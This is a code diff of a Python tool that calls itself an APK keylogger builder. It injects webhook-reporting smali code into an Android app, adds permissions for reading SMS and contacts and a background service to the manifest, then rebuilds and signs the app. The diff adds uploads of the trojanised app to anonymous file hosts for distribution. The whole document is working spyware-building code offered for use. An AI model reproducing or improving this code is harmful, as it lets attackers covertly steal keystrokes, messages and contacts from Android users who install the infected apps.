@@ -2,9 +2,9 @@
 """
 ============================================================
   TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL)
-  - Uses apktool -r (no aapt)
-  - Handles encoding errors in manifest
-  - Developer: GT Security Team
+  - APK saved to /sdcard/Download/ for easy access
+  - Multiple cloud upload fallbacks
+  - No aapt required
 ============================================================
 """
 
@@ -257,32 +257,36 @@ def generate_smali(webhook, features, interval):
 '''
     return outer, inner
 
-# ---------------------------- UPLOAD TO CLOUD ----------------------------
+# ---------------------------- UPLOAD TO CLOUD (MULTIPLE FALLBACKS) ----------------------------
 def upload_to_cloud(filepath):
     print_c("[*] Uploading to cloud...", Colors.YELLOW)
-    try:
-        with open(filepath, 'rb') as f:
-            resp = requests.post("https://file.io", files={"file": (os.path.basename(filepath), f)}, timeout=60)
-        if resp.status_code == 200 and resp.json().get('success'):
-            return resp.json().get('link')
-    except:
-        pass
-    try:
-        with open(filepath, 'rb') as f:
-            resp = requests.post("https://api.anonfiles.com/upload", files={"file": (os.path.basename(filepath), f)}, timeout=60)
-        if resp.status_code == 200 and resp.json().get('status'):
-            return resp.json()['data']['file']['url']['full']
-    except:
-        pass
+    services = [
+        ("file.io", "https://file.io", lambda r: r.json().get('link')),
+        ("anonfiles", "https://api.anonfiles.com/upload", lambda r: r.json()['data']['file']['url']['full'] if r.json().get('status') else None),
+        ("gofile", "https://api.gofile.io/uploadFile", lambda r: r.json()['data']['downloadPage'] if r.json().get('status') == 'ok' else None)
+    ]
+    for name, url, extractor in services:
+        try:
+            with open(filepath, 'rb') as f:
+                files = {'file': (os.path.basename(filepath), f)}
+                resp = requests.post(url, files=files, timeout=60)
+                if resp.status_code == 200:
+                    link = extractor(resp)
+                    if link:
+                        print_c(f"[✓] Uploaded via {name}", Colors.GREEN)
+                        return link
+        except Exception as e:
+            print_c(f"[!] {name} failed: {e}", Colors.RED)
+            continue
     return None
 
-# ---------------------------- INJECTION ENGINE (NO AAPT, ENCODING FIX) ----------------------------
+# ---------------------------- INJECTION ENGINE ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
 
     try:
-        # ---------- DECODE WITH -r (skip resources) ----------
+        # Decode with -r (skip resources)
         print_c("[*] Decoding APK (resources skipped)...", Colors.YELLOW)
         decode_cmd = [shutil.which('apktool'), "d", "-r", input_apk, "-o", work_dir, "-f"]
         result = subprocess.run(decode_cmd, capture_output=True, text=True)
@@ -304,13 +308,11 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             f.write(inner_smali)
         print_c("[DEBUG] Smali files written to: " + smali_dir, Colors.CYAN)
 
-        # ---------- MODIFY MANIFEST (with encoding error handling) ----------
+        # Modify manifest (handle encoding)
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
-        # Read with 'ignore' to skip invalid UTF-8 bytes
         with open(manifest_path, "r", encoding='utf-8', errors='ignore') as f:
             manifest = f.read()
 
-        # Add permissions
         perms = ['android.permission.INTERNET']
         if features.get('sms'): perms.append('android.permission.READ_SMS')
         if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
@@ -326,11 +328,10 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         if service_tag not in manifest:
             manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')
 
-        # Write back with UTF-8
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
 
-        # ---------- REBUILD (no aapt needed) ----------
+        # Rebuild
         print_c("[*] Rebuilding APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
@@ -340,9 +341,9 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             print_c("[!] Build failed:", Colors.RED)
             print_c(result.stderr, Colors.RED)
             shutil.rmtree(work_dir, ignore_errors=True)
-            raise Exception("APK rebuild failed. Ensure apktool is working.")
+            raise Exception("APK rebuild failed.")
 
-        # Sign & align
+        # Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         sign_cmd = [
@@ -357,6 +358,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             shutil.rmtree(work_dir, ignore_errors=True)
             raise Exception("APK signing failed.")
 
+        # Align
         print_c("[*] Aligning APK...", Colors.YELLOW)
         apk_final = os.path.join(work_dir, "app-final.apk")
         align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
@@ -367,6 +369,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             shutil.rmtree(work_dir, ignore_errors=True)
             raise Exception("APK alignment failed.")
 
+        # Copy to final output (in injected_apks folder)
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
         shutil.rmtree(work_dir, ignore_errors=True)
@@ -410,7 +413,7 @@ def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
     ║   APK KEYLOGGER BUILDER v3.6             ║
-    ║   No aapt – handles encoding issues      ║
+    ║   APK saved to /sdcard/Download/         ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -472,15 +475,24 @@ def inject_flow():
         elapsed = time.time() - start
         print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
 
-        print_c("[*] Uploading to cloud for download link...", Colors.YELLOW)
-        link = upload_to_cloud(output_apk)
+        # ---------- COPY TO /sdcard/Download/ FOR EASY ACCESS ----------
+        sdcard_download = "/sdcard/Download"
+        if os.path.exists(sdcard_download):
+            sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
+            shutil.copy2(output_apk, sdcard_apk)
+            print_c(f"\n📁 APK also copied to: {sdcard_apk}", Colors.CYAN)
+            print_c("👉 Open your file manager and go to 'Download' folder.", Colors.GREEN)
+        else:
+            print_c("\n[!] /sdcard/Download not found. APK is saved in:", Colors.YELLOW)
+            print_c(f"   {output_apk}", Colors.YELLOW)
 
+        # Try to upload to cloud
+        link = upload_to_cloud(output_apk)
         if link:
             print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
             print_c(f"   {link}", Colors.CYAN)
         else:
-            print_c("[!] Upload failed. APK saved locally:", Colors.RED)
-            print_c(f"   {output_apk}", Colors.YELLOW)
+            print_c("[!] Upload failed. APK is available locally.", Colors.RED)
 
         print_c(f"\n📁 Local APK location: {output_apk}", Colors.BLUE)
 
